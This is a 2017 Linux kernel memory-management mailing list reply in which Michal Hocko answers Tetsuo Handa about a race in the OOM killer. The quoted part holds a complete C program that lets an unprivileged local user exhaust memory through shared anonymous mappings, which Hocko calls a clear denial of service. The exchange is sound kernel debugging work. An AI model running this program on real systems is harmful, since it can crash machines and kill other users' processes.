Return-Path: <owner-linux-mm@kvack.org>
Received: from mail-wm0-f70.google.com (mail-wm0-f70.google.com [74.125.82.70])
	by kanga.kvack.org (Postfix) with ESMTP id 8682E6B0525
	for <linux-mm@kvack.org>; Tue,  1 Aug 2017 07:30:20 -0400 (EDT)
Received: by mail-wm0-f70.google.com with SMTP id m80so2108671wmd.4
        for <linux-mm@kvack.org>; Tue, 01 Aug 2017 04:30:20 -0700 (PDT)
Received: from mx1.suse.de (mx2.suse.de. [195.135.220.15])
        by mx.google.com with ESMTPS id b53si10963604wrd.550.2017.08.01.04.30.19
        for <linux-mm@kvack.org>
        (version=TLS1 cipher=AES128-SHA bits=128/128);
        Tue, 01 Aug 2017 04:30:19 -0700 (PDT)
Date: Tue, 1 Aug 2017 13:30:16 +0200
From: Michal Hocko <mhocko@kernel.org>
Subject: Re: Possible race condition in oom-killer
Message-ID: <20170801113016.GF15774@dhcp22.suse.cz>
References: <20170728130723.GP2274@dhcp22.suse.cz>
 <201707282215.AGI69210.VFOHQFtOFSOJML@I-love.SAKURA.ne.jp>
 <20170728132952.GQ2274@dhcp22.suse.cz>
 <201707282255.BGI87015.FSFOVQtMOHLJFO@I-love.SAKURA.ne.jp>
 <20170728140706.GT2274@dhcp22.suse.cz>
 <201708011946.JFC04140.FFLFOSOMQHtOVJ@I-love.SAKURA.ne.jp>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <201708011946.JFC04140.FFLFOSOMQHtOVJ@I-love.SAKURA.ne.jp>
Sender: owner-linux-mm@kvack.org
List-ID: <linux-mm.kvack.org>
To: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
Cc: mjaggi@caviumnetworks.com, linux-kernel@vger.kernel.org, linux-mm@kvack.org

On Tue 01-08-17 19:46:38, Tetsuo Handa wrote:
> Michal Hocko wrote:
> > > >                                                                   Is
> > > > something other than the LTP test affected to give this more priority?
> > > > Do we have other usecases where something mlocks the whole memory?
> > > 
> > > This panic was caused by 50 threads sharing MMF_OOM_SKIP mm exceeding
> > > number of OOM killable processes. Whether memory is locked or not isn't
> > > important.
> > 
> > You are wrong here I believe. The whole problem is that the OOM victim
> > is consuming basically all the memory (that is what the test case
> > actually does IIRC) and that memory is mlocked. oom_reaper is much
> > faster to evaluate the mm of the victim and bail out sooner than the
> > exit path actually manages to tear down the address space. And so we
> > have to find other oom victims until we simply kill everything and
> > panic.
> 
> Again, whether memory is locked or not isn't important. I can easily
> reproduce unnecessary OOM victim selection as a local unprivileged user
> using below program.
> 
> ----------
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <unistd.h>
> #include <sched.h>
> #include <sys/mman.h>
> 
> #define NUMTHREADS 128
> #define MMAPSIZE 128 * 1048576
> #define STACKSIZE 4096
> static int pipe_fd[2] = { EOF, EOF };
> static int memory_eater(void *unused)
> {
> 	int fd = open("/dev/zero", O_RDONLY);
> 	char *buf = mmap(NULL, MMAPSIZE, PROT_WRITE | PROT_READ,
> 			 MAP_ANONYMOUS | MAP_SHARED, EOF, 0);
> 	read(pipe_fd[0], buf, 1);
> 	read(fd, buf, MMAPSIZE);
> 	pause();
> 	return 0;
> }
> int main(int argc, char *argv[])
> {
> 	int i;
> 	char *stack;
> 	if (fork() || fork() || setsid() == EOF || pipe(pipe_fd))
> 		_exit(0);
> 	stack = mmap(NULL, STACKSIZE * NUMTHREADS, PROT_WRITE | PROT_READ,
> 		     MAP_ANONYMOUS | MAP_SHARED, EOF, 0);
> 	for (i = 0; i < NUMTHREADS; i++)
>                 if (clone(memory_eater, stack + (i + 1) * STACKSIZE,
> 			  CLONE_THREAD | CLONE_SIGHAND | CLONE_VM | CLONE_FS |
> 			  CLONE_FILES, NULL) == -1)
>                         break;
> 	sleep(1);
> 	close(pipe_fd[1]);
> 	pause();
> 	return 0;
> }

This is a clear DoS. There is sadly^Wsimply no implicit limit for the
amount of shared anonymous memory. This is very close to consuming shmem
via fs interface except the fs interface has an upper bound for the size.
I do not thing this is anything new. If you are creative enough you can
DoS the system the same way regardless of the oom reaper by passing
shmem fds around AFAICS...

[...]
> > > If a multi-threaded process which consumes little memory was
> > > selected as an OOM victim (and reaped by the OOM reaper and MMF_OOM_SKIP
> > > was set immediately), it might be still possible to select next OOM victims
> > > needlessly.
> > 
> > This would be true if the address space itself only contained a little
> > amount of memory and the large part of the memory was in page tables or
> > other resources which oom_reaper cannot work with. This is not a usual
> > case though.
> 
> mlock()ing whole memory needs CAP_IPC_LOCK, but consuming whole memory as
> MAP_SHARED does not need CAP_IPC_LOCK. And I think we can relax MMF_OOM_SKIP
> test in task_will_free_mem() to ignore MMF_OOM_SKIP for once

As I've said it is not that simple. I will comment on your other email.

> for "mm, oom: do not grant oom victims full memory reserves access"
> might be too large change for older kernels which next version of LTS
> distributions would choose.

While this is annoying I do not think this is something new. If you have
an untrusted user on the system you better contain it (you can use memcg
for example).

-- 
Michal Hocko
SUSE Labs

--
To unsubscribe, send a message with 'unsubscribe linux-mm' in
the body to majordomo@kvack.org.  For more info on Linux MM,
see: http://www.linux-mm.org/ .
Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
